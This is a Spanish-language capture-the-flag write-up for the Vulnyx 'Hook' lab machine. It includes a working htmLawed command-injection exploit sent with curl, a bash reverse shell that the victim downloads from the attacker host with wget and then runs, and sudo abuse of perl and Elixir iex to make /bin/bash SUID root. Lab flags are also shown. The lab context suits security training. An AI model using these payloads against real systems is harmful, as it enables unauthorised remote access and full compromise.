---
icon: flag
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
---

# Hook Vulnyx (Easy - Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-18 04:11 EDT
Nmap scan report for 192.168.5.83
Host is up (0.0015s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 a9:a8:52:f3:cd:ec:0d:5b:5f:f3:af:5b:3c:db:76:b6 (ECDSA)
|_  256 73:f5:8e:44:0c:b9:0a:e0:e7:31:0c:04:ac:7e:ff:fd (ED25519)
80/tcp   open  http    Apache httpd 2.4.59 ((Debian))
|_http-server-header: Apache/2.4.59 (Debian)
|_http-title: Apache2 Debian Default Page: It works
| http-robots.txt: 1 disallowed entry 
|_/htmLawed
4369/tcp open  epmd    Erlang Port Mapper Daemon
| epmd-info: 
|   epmd_port: 4369
|_  nodes: 
MAC Address: 08:00:27:D7:4F:EC (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.41 seconds
```

Veremos varios puertos interesantes, si entramos en el puerto `80` veremos una pagina web normal de `apache2` sin importancia, por lo que vamos a realizar un poco de `fuzzing` a ver que vemos.

## Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt -t 50 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.5.83/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 10701]
/.html                (Status: 403) [Size: 277]
/.php                 (Status: 403) [Size: 277]
/robots.txt           (Status: 200) [Size: 34]
/.html                (Status: 403) [Size: 277]
/.php                 (Status: 403) [Size: 277]
Progress: 334217 / 882244 (37.88%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 334335 / 882244 (37.90%)
===============================================================
Finished
===============================================================
```

Veremos que hay un `robots.txt` si entramos dentro veremos lo siguiente:

```
User-agent: *
Disallow: /htmLawed
```

Vamos a ver que contiene dicho recurso web.

```
URL = http://<IP>/htmLawed
```

Veremos una web de un software llamado `Lawed`, vamos a comprobar la version de dicha pagina y buscar algun exploit si lo tuviera.

## Escalate user www-data

Si buscamos un poco veremos lo siguiente:

URL = [CVE-2022-52023 ExploitDB](https://www.exploit-db.com/exploits/52023)

URL = [Info Vuln](https://mayfly277.github.io/posts/GLPI-htmlawed-CVE-2022-35914/)

Vemos que se puede realizar un `RCE` directamente en la pagina, si leemos un poco veremos que la forma de explotarlo es mediante una `URL` en concreto, pero vamos a descargarnos el archivo y a ejecutarlo de esta forma:

La `URL` tiene que apuntar a un archivo en concreto que es el vulnerable llamado `htmLawedTest.php` por lo que leimos en la documentacion.

```shell
dos2unix 52023.sh
chmod +x 52023.sh
./52023.sh -u 'http://<IP>/htmLawed/htmLawedTest.php' -c 'whoami'
```

Pero si no os funciona, podemos hacerlo de esta forma tambien:

```shell
apt install html2text
curl -s -d "sid=foo&hhook=exec&text=id" -b "sid=foo" "http://<IP>/htmLawed/htmLawedTest.php" | html2text | grep "memory" -A 1 | grep -v "memory"
```

Info:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Veremos que esta funcionando, por lo que vamos a realizar una `reverse shell` de esta forma:

> shell.sh

```bash
#!/bin/bash

bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'
```

Vamos abrir un servidor de `python3` para suministrar el archivo.

```shell
python3 -m http.server 80
```

Ahora vamos hacer que se lo descargue la maquina victima.

```shell
curl -s -d "sid=foo&hhook=exec&text=wget http://<IP_ATTACKER>/shell.sh" -b "sid=foo" "http://<IP>/htmLawed/htmLawedTest.php" | html2text | grep "memory" -A 1 | grep -v "memory"
```

Echo esto, vamos a ejecutar dicho archivo de esta forma:

```shell
curl -s -d "sid=foo&hhook=exec&text=bash shell.sh" -b "sid=foo" "http://<IP>/htmLawed/htmLawedTest.php" | html2text | grep "memory" -A 1 | grep -v "memory"
```

Antes de enviarlo vamos a ponernos a la escucha:

```shell
nc -lvnp <PORT>
```

Ahora si enviamos el anterior comando y volvemos a donde tenemos la escucha, veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.5.50] from (UNKNOWN) [192.168.5.83] 37456
bash: cannot set terminal process group (495): Inappropriate ioctl for device
bash: no job control in this shell
www-data@hook:/var/www/html/htmLawed$ whoami
whoami
www-data
```

Veremos que ha funcionado, por lo que sanitizaremos la `shell`.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate user noname

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for www-data on hook:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User www-data may run the following commands on hook:
    (noname) NOPASSWD: /usr/bin/perl
```

Vemos que podemos ejecutar el binario `perl` como el usuario `noname`, por lo que podremos hacer lo siguiente:

```shell
sudo -u noname perl -e 'exec "/bin/bash";'
```

Info:

```
noname@hook:/var/www/html/htmLawed$ whoami
noname
```

Veremos que seremos dicho usuario, por lo que leeremos la `flag` del usuario.

> user.txt

```
2ee7e8d7f8f2b515c0bdf19d5ce85e17
```

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for noname on hook:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User noname may run the following commands on hook:
    (root) NOPASSWD: /usr/bin/iex
```

Vemos que podemos ejecutar el binario `iex` como el usuario `root`, por lo que podremos hacer lo siguiente:

```shell
sudo iex
```

Info:

```
Erlang/OTP 25 [erts-13.1.5] [source] [64-bit] [smp:1:1] [ds:1:1:10] [async-threads:1] [jit:ns]

Interactive Elixir (1.14.0) - press Ctrl+C to exit (type h() ENTER for help)
iex(1)>
```

Ahora si hacemos `h()` para ver el `help`, en el propio `help` no veremos nada interesante, pero si buscamos su documentacion, veremos que podremos ejecutar comandos utilizando el siguiente comando `System.cmd/2` por lo que haremos esto.

```shell
System.cmd("whoami", [])
```

Info:

```
{"root\n", 0}
```

Veremos que esta funcionando, vamos a establecer con permisos `SUID` la `bash` directamente.

```shell
System.cmd("chmod", ["u+s", "/bin/bash"])
```

Info:

```
{"", 0}
```

Ahora vamos a salirnos pulsando `Ctrl+C` dos veces y si listamos la `bash`...

```shell
ls -la /bin/bash
```

Info:

```
-rwsr-xr-x 1 root root 1265648 Apr 23  2023 /bin/bash
```

Veremos que ha funcionado de forma correcta, por lo que haremos esto:

```shell
bash -p
```

Info:

```
bash-5.2# whoami
root
```

Veremos que ya seremos `root`, por lo que leeremos la `flag` de `root`.

> root.txt

```
708883f44e1b0e57c8a501e176fad8a9
```
